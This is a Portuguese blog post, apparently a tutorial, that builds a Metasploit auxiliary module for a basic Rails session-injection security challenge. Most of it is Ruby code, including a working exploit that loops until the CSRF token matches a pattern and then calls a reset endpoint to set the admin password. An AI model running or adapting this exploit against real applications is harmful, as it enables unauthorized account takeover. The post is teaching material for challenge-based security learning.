---
layout: post
title: "Rails session injection challenge: criando um módulo para o Metasploit"
date: 2015-03-31 15:49:07 -0300
comments: true
categories: [Metasploit]
author: Joridos
---

```
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        http://metasploit.pro
```

Recentemente o [@akitaonrails](https://twitter.com/akitaonrails) fez um [post](http://www.akitaonrails.com/2014/08/27/small-bite-brincando-com-metasploit) sobre um [ desafio básico de segurança](https://twitter.com/joernchen/status/504304803045208064) do [@joernchen](https://twitter.com/joernchen).

O desafio é realmente básico, mas aproveitei a oportunidade para mostrar como desenvolver um módulo para o Metasploit.

Vamos criar um módulo auxiliar, para isso crie o arquivo `metasploit-framework/modules/auxiliary/admin/http/rails_csrf_token_bypass.rb` contendo:

``` Ruby
require 'msf/core'
require 'mechanize'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
  end

  def check
  end

  def run
  end
end
```
Importamos primeiramente o core do Metasploit(`require 'msf/core'`) e a gem [mechanize](https://rubygems.org/gems/mechanize)(`require 'mechanize'`), incluimos também o `Msf::Exploit::Remote::HttpClient` que nos traz algumas coisas úteis como validação de parâmetros e muito mais, após criamos 3 métodos:

* initialize : Adicionamos informações do módulo que será usado pelo Metasploit.
* check : Faremos a validação se o host está vulneravel.
* run : Código que explorará a falha.

##initialize

Nesse método adicionamos informações como nome, descrição, autor e licença no `super()`, e adicionamos algumas opções para usarmos no exploit com `register_options`.

``` Ruby
#include......

def initialize
  super(
    'Name'           => 'Rails CSRF Bypass',
    'Version'        => '$Revision: 1 $',
    'Description'    => 'Session Injection Exploit for Rails App',
    'Author'        =>
    [
      'akitaonrails', #original discovery and disclosure
      'joridos' #metasploit module
    ],
    'License'        => MSF_LICENSE
  )
  register_options(
    [
      OptString.new('TARGETURI', [ true,  'The request URI', '/reset/_csrf_token']),
      OptString.new('PASSWORD', [true, 'The password to set']),
    ], self.class)
end

#def check.....
```

##check

Aqui nós verificamos se o alvo está online e vulnerável, então exibimos `Exploit::CheckCode::Detected[0]` e retornamos `Exploit::CheckCode::Vulnerable`, se não estiver vulnerável retornamos `return Exploit::CheckCode::Safe`.

``` Ruby
def check
  agent = Mechanize.new { |agent|
    agent.user_agent_alias = 'Mac Safari'
  }
  if page = agent.get("http://#{datastore['RHOST']}/")
    print_status Exploit::CheckCode::Detected[0]
  else
    print_error "Host not found"
    return Exploit::CheckCode::Unsupported
  end
  if page.at('meta[@name="csrf-token"]')[:content]
    print_status('Found csrf-token, exploitable')
    return Exploit::CheckCode::Vulnerable
  else
    return Exploit::CheckCode::Safe
  end
end
```

Tipos de retorno disponível:

``` Ruby
CheckCode::Safe # não explorável
CheckCode::Detected # serviço detectado
CheckCode::Appears # versão vulnerável
CheckCode::Vulnerable # confirmado a vulnerabilidade
CheckCode::Unsupported # não suportado para este módulo.
```

##run

Nesse método temos o código do exploit feito pelo [@akitaonrails](https://twitter.com/akitaonrails), modificado um pouco para o módulo.

``` Ruby
def run
  $hacked = false
  if datastore['PASSWORD'].length < 7
    print_error("use password from 7 characters and no special characters")
    return Exploit::CheckCode::Unsupported
  end
  begin
    agent = Mechanize.new { |agent|
      agent.user_agent_alias = 'Mac Safari'
    }
    page = agent.get("http://#{datastore['RHOST']}/")
    token = page.at('meta[@name="csrf-token"]')[:content]
    print_status "#{token}"
    if token =~ /^1\w+/
      doc = agent.get("http://#{datastore['RHOST']}#{datastore['TARGETURI']}?password=#{datastore['PASSWORD']}")
      $hacked = doc.content
      print_good doc.content
    end
  end  while $hacked != "password changed ;)"
    print_good "user: admin"
    print_good "pass: #{datastore['PASSWORD']}"
end
```

Nosso exploit completo fica:

``` Ruby
require 'msf/core'
require 'mechanize'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'           => 'Rails CSRF Bypass',
      'Version'        => '$Revision: 1 $',
      'Description'    => 'Session Injection Exploit for Rails App',
      'Author'        =>
      [
        'akitaonrails', #original discovery and disclosure
        'joridos' #metasploit module
      ],
      'License'        => MSF_LICENSE
    )
    register_options(
      [
        OptString.new('TARGETURI', [ true,  'The request URI', '/reset/_csrf_token']),
        OptString.new('PASSWORD', [true, 'The password to set']),
      ], self.class)
  end

  def check
    agent = Mechanize.new { |agent|
      agent.user_agent_alias = 'Mac Safari'
    }
    if page = agent.get("http://#{datastore['RHOST']}/")
      print_status Exploit::CheckCode::Detected[0]
    else
      print_error "Host not found"
      return Exploit::CheckCode::Unsupported
    end
    if page.at('meta[@name="csrf-token"]')[:content]
      print_status('Found csrf-token, exploitable')
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run
    $hacked = false
    if datastore['PASSWORD'].length < 7
      print_error("use password from 7 characters and no special characters")
      return Exploit::CheckCode::Unsupported
    end
    begin
      agent = Mechanize.new { |agent|
        agent.user_agent_alias = 'Mac Safari'
      }
      page = agent.get("http://#{datastore['RHOST']}/")
      token = page.at('meta[@name="csrf-token"]')[:content]
      print_status "#{token}"
      if token =~ /^1\w+/
        doc = agent.get("http://#{datastore['RHOST']}#{datastore['TARGETURI']}?password=#{datastore['PASSWORD']}")
        $hacked = doc.content
        print_good doc.content
      end
    end  while $hacked != "password changed ;)"
      print_good "user: admin"
      print_good "pass: #{datastore['PASSWORD']}"
  end
end
```

Adicione o `mechanize` no Gemfile do metasploit:

``` Ruby
group :development, :test do
  # Other gems.........
  # Mechanize for exploit rails_csrf_token_bypass
  gem 'mechanize'
end
```

Agora basta executar:

``` sh
$ bundle install
```

[GitHub source code](https://github.com/joridos/Rails-session-injection-challenge)

E usar:
#![Metasploit](/images/rails_csrf01.png)
#![Metasploit](/images/rails_csrf02.png)
#![Metasploit](/images/rails_csrf03.png)
#![Metasploit](/images/rails_csrf04.png)
#![Metasploit](/images/rails_csrf05.png)
#![Metasploit](/images/rails_csrf06.png)